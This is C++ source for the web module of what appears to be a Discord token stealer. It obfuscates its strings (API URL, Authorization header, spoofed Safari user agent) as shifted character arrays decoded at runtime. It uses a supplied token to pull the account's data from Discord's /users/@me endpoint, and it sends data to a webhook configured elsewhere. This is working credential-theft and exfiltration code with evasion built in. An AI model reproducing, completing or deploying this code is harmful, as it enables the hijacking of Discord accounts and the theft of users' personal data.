#include "Web.h"
#include "Config.h"
#include <iostream>

using namespace hentai;

json web::get_data_from_token(std::string token)
{
	// https://discord.com/api/v9/users/@me
	const char url[] = {107, 113, 119, 109, 118, 55, 50, 44, 103, 102, 118, 96, 114, 111, 103, 43, 102, 108, 112, 44, 100, 109, 108, 44, 121, 54, 50, 114, 118, 98, 117, 112, 50, 61, 112, 98, '\0'};
	// Authorization
	const char authorization[] = {68, 114, 119, 101, 114, 111, 108, 119, 100, 113, 108, 108, 113, '\0'};
	// User-Agent
	const char user_agent[] = {88, 112, 104, 111, 48, 62, 106, 98, 113, 113, '\0'};
	// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15
	const char agent_value[] = {80, 108, 125, 102, 111, 105, 100, 44, 56, 43, 51, 29, 43, 74, 100, 96, 108, 107, 119, 108, 118, 101, 62, 29, 76, 107, 119, 98, 111, 29, 80, 94, 102, 29, 82, 80, 35, 85, 35, 46, 51, 92, 52, 46, 98, 51, 44, 29, 68, 109, 115, 105, 104, 84, 104, 95, 78, 102, 119, 44, 57, 45, 56, 43, 52, 43, 52, 50, 35, 37, 78, 69, 87, 74, 79, 41, 35, 105, 108, 104, 104, 29, 74, 98, 102, 104, 114, 38, 35, 83, 104, 111, 118, 102, 114, 107, 50, 46, 52, 43, 52, 43, 53, 29, 86, 94, 105, 94, 117, 102, 50, 51, 51, 50, 49, 46, 49, 46, 56, '\0'};

	json data = web::do_get_request_return_json(uwu(url), {{uwu(authorization), token},
														   {uwu(user_agent), uwu(agent_value)}});
	return data;
}

json web::do_get_request_return_json(std::string url, std ::map<std ::string, std::string> headers, int valid_code)
{
	cpr::Header request_headers;
	for (auto &h : headers)
	{
		request_headers[h.first] = h.second;
	}

	cpr::Response r = cpr::Get(cpr::Url{url}, request_headers);

	if (r.status_code != valid_code)
		return {};

	return json::parse(r.text);
}

void web::send_to_webhook(std::string data)
{
	// Content-Type
	const char content_type[] = {70, 108, 113, 113, 104, 107, 119, 42, 87, 118, 115, 98, '\0'};
	// application/json
	const char type_value[] = {100, 109, 115, 105, 108, 96, 100, 113, 108, 108, 113, 44, 109, 112, 114, 107, '\0'};

	cpr::Response r = cpr::Post(cpr::Url{config::webhook}, cpr::Header{{uwu(content_type), uwu(type_value)}}, cpr::Body{data});
}
